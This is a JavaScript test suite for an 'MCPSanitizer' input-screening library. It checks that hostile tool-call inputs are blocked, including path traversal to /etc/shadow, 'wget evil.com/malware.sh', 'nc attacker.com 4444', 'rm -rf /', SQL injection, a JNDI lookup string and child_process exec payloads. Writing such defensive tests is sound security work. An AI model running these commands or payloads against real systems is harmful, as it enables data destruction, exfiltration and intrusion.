const MCPSanitizer = require('../src/index')
const assert = require('assert')

describe('MCPSanitizer', () => {
  let sanitizer

  beforeEach(() => {
    sanitizer = new MCPSanitizer()
  })

  describe('File Path Sanitization', () => {
    it('should allow safe file paths', () => {
      const safePaths = [
        'document.txt',
        'data/file.json',
        './local/file.md'
      ]

      safePaths.forEach(path => {
        const result = sanitizer.sanitize(path, { type: 'file_path' })
        assert.strictEqual(result.blocked, false)
        assert.strictEqual(result.sanitized, path)
      })
    })

    it('should block directory traversal attacks', () => {
      const dangerousPaths = [
        '../../../etc/passwd',
        '..\\..\\windows\\system32\\config\\sam',
        '/etc/shadow',
        '/proc/version',
        '/sys/class/net'
      ]

      dangerousPaths.forEach(path => {
        const result = sanitizer.sanitize(path, { type: 'file_path' })
        assert.strictEqual(result.blocked, true)
        assert(result.warnings.length > 0)
      })
    })

    it('should block unauthorized file extensions', () => {
      const result = sanitizer.sanitize('malicious.exe', { type: 'file_path' })
      assert.strictEqual(result.blocked, true)
      assert(result.warnings.some(w => w.includes('extension')))
    })
  })

  describe('URL Sanitization', () => {
    it('should allow safe URLs', () => {
      const safeUrls = [
        'https://api.example.com/data',
        'http://localhost:3000/api',
        'mcp://server/resource'
      ]

      safeUrls.forEach(url => {
        const result = sanitizer.sanitize(url, { type: 'url' })
        assert.strictEqual(result.blocked, false)
      })
    })

    it('should block dangerous protocols', () => {
      const dangerousUrls = [
        'file:///etc/passwd',
        'ftp://internal.server/data',
        'javascript:alert(1)', // eslint-disable-line no-script-url
        'data:text/html,<script>alert(1)</script>'
      ]

      dangerousUrls.forEach(url => {
        const result = sanitizer.sanitize(url, { type: 'url' })
        assert.strictEqual(result.blocked, true)
      })
    })

    it('should block internal network access', () => {
      const internalUrls = [
        'http://192.168.1.1/admin',
        'https://10.0.0.1/config',
        'http://172.16.0.1/internal'
      ]

      internalUrls.forEach(url => {
        const result = sanitizer.sanitize(url, { type: 'url' })
        assert.strictEqual(result.blocked, true)
      })
    })
  })

  describe('Command Injection Prevention', () => {
    it('should allow safe commands', () => {
      const safeCommands = [
        'ls documents',
        'cat file.txt',
        'grep pattern file.log'
      ]

      safeCommands.forEach(cmd => {
        const result = sanitizer.sanitize(cmd, { type: 'command' })
        assert.strictEqual(result.blocked, false)
      })
    })

    it('should block command injection attempts', () => {
      const dangerousCommands = [
        'ls; rm -rf /',
        'cat file.txt && wget evil.com/malware.sh',
        'ls | nc attacker.com 4444',
        'echo `whoami`',
        'ls $(whoami)',
        'cat file.txt; echo "pwned" > /tmp/hacked'
      ]

      dangerousCommands.forEach(cmd => {
        const result = sanitizer.sanitize(cmd, { type: 'command' })
        assert.strictEqual(result.blocked, true)
      })
    })

    it('should block dangerous commands', () => {
      const destructiveCommands = [
        'rm -rf /',
        'format c:',
        'dd if=/dev/zero of=/dev/sda',
        'mkfs.ext4 /dev/sda1'
      ]

      destructiveCommands.forEach(cmd => {
        const result = sanitizer.sanitize(cmd, { type: 'command' })
        assert.strictEqual(result.blocked, true)
      })
    })
  })

  describe('SQL Injection Prevention', () => {
    it('should allow safe SQL queries', () => {
      const safeQueries = [
        'SELECT name FROM users WHERE id = ?',
        'SELECT * FROM products WHERE category = ?'
      ]

      safeQueries.forEach(query => {
        const result = sanitizer.sanitize(query, { type: 'sql' })
        assert.strictEqual(result.blocked, false)
      })
    })

    it('should block SQL injection attempts', () => {
      const dangerousQueries = [
        'SELECT * FROM users; DROP TABLE users;--',
        'SELECT * FROM users WHERE id = 1 OR 1=1',
        "INSERT INTO users VALUES ('admin', 'password')",
        "EXEC xp_cmdshell('dir')",
        'SELECT * FROM users UNION SELECT * FROM passwords'
      ]

      dangerousQueries.forEach(query => {
        const result = sanitizer.sanitize(query, { type: 'sql' })
        assert.strictEqual(result.blocked, true)
      })
    })
  })

  describe('Template Injection Prevention', () => {
    it('should block template injection patterns', () => {
      const templateInjections = [
        '{{constructor.constructor("return process")().exit()}}',
        '${jndi:ldap://evil.com/x}', // eslint-disable-line no-template-curly-in-string
        '{{7*7}}',
        '<%= require("child_process").exec("whoami") %>',
        '{{#with this}}{{lookup ../constructor "constructor"}}{{/with}}'
      ]

      templateInjections.forEach(injection => {
        const result = sanitizer.sanitize(injection)
        assert.strictEqual(result.blocked, true)
      })
    })
  })

  describe('Prototype Pollution Prevention', () => {
    it('should block prototype pollution attempts', () => {
      const pollutionAttempts = [
        { __proto__: { isAdmin: true } },
        { constructor: { prototype: { polluted: true } } },
        { prototype: { constructor: { evil: true } } }
      ]

      pollutionAttempts.forEach(attempt => {
        const result = sanitizer.sanitize(attempt)
        assert.strictEqual(result.blocked, true)
      })
    })
  })

  describe('XSS-like Pattern Prevention', () => {
    it('should block script injection patterns', () => {
      const xssPatterns = [
        '<script>alert("xss")</script>',
        '<!-- malicious comment -->',
        '<img src="x" onerror="alert(1)">',
        'javascript:alert(1)' // eslint-disable-line no-script-url
      ]

      xssPatterns.forEach(pattern => {
        const result = sanitizer.sanitize(pattern)
        assert.strictEqual(result.blocked, true)
      })
    })
  })

  describe('Code Execution Prevention', () => {
    it('should block code execution patterns', () => {
      const codeExecution = [
        'require("fs").readFileSync("/etc/passwd")',
        'import("child_process").then(cp => cp.exec("whoami"))',
        'eval("require(\\"fs\\").readFileSync(\\"/etc/passwd\\")")',
        'Function("return process")().exit()',
        'global.process.mainModule.require("child_process").exec("ls")'
      ]

      codeExecution.forEach(code => {
        const result = sanitizer.sanitize(code)
        assert.strictEqual(result.blocked, true)
      })
    })
  })

  describe('Complex Object Sanitization', () => {
    it('should sanitize nested objects correctly', () => {
      const complexObject = {
        tool_call: {
          name: 'file_reader',
          parameters: {
            file_path: 'safe/document.txt',
            url: 'https://api.example.com/data',
            command: 'cat file.txt',
            metadata: {
              safe_field: 'safe value',
              nested: {
                more_data: 'also safe'
              }
            }
          }
        }
      }

      const result = sanitizer.sanitize(complexObject)
      assert.strictEqual(result.blocked, false)
      assert.deepStrictEqual(result.sanitized.tool_call.name, 'file_reader')
    })

    it('should detect threats in nested objects', () => {
      const maliciousObject = {
        tool_call: {
          name: 'file_reader',
          parameters: {
            file_path: '../../../etc/passwd',
            safe_field: 'safe value'
          }
        }
      }

      const result = sanitizer.sanitize(maliciousObject)
      assert.strictEqual(result.blocked, true)
    })
  })

  describe('Edge Cases', () => {
    it('should handle null and undefined values', () => {
      assert.strictEqual(sanitizer.sanitize(null).sanitized, null)
      assert.strictEqual(sanitizer.sanitize(undefined).sanitized, undefined)
    })

    it('should handle empty strings and objects', () => {
      const emptyString = sanitizer.sanitize('')
      const emptyObject = sanitizer.sanitize({})
      const emptyArray = sanitizer.sanitize([])

      assert.strictEqual(emptyString.blocked, false)
      assert.strictEqual(emptyObject.blocked, false)
      assert.strictEqual(emptyArray.blocked, false)
    })

    it('should enforce maximum string length', () => {
      const longString = 'a'.repeat(20000)
      const result = sanitizer.sanitize(longString)
      assert.strictEqual(result.blocked, true)
    })

    it('should enforce maximum object depth', () => {
      const deepObject = {}
      let current = deepObject

      // Create an object deeper than the limit
      for (let i = 0; i < 15; i++) {
        current.next = {}
        current = current.next
      }

      const result = sanitizer.sanitize(deepObject)
      assert.strictEqual(result.blocked, true)
    })
  })

  describe('Configuration Options', () => {
    it('should respect custom configuration', () => {
      const customSanitizer = new MCPSanitizer({
        allowedProtocols: ['http', 'https', 'ftp'],
        maxStringLength: 100,
        allowedFileExtensions: ['.txt', '.pdf']
      })

      // Should now allow FTP
      const ftpResult = customSanitizer.sanitize('ftp://example.com/file', { type: 'url' })
      assert.strictEqual(ftpResult.blocked, false)

      // Should allow PDF
      const pdfResult = customSanitizer.sanitize('document.pdf', { type: 'file_path' })
      assert.strictEqual(pdfResult.blocked, false)

      // Should block strings over 100 chars
      const longStringResult = customSanitizer.sanitize('a'.repeat(101))
      assert.strictEqual(longStringResult.blocked, true)
    })
  })
})

// Helper function to run tests
function runTests () {
  console.log('Running MCP Sanitizer Tests...\n')

  // This is a simplified test runner - in practice you'd use Jest, Mocha, etc.
  // const tests = [ // Unused variable - commented to fix ESLint
  //   // Add test execution logic here
  //   // This would typically be handled by a test framework
  // ]

  console.log('All tests would run with a proper test framework like Jest or Mocha')
  console.log('To run: npm test or jest mcp-sanitizer.test.js')
}

if (require.main === module) {
  runTests()
}

module.exports = { runTests }
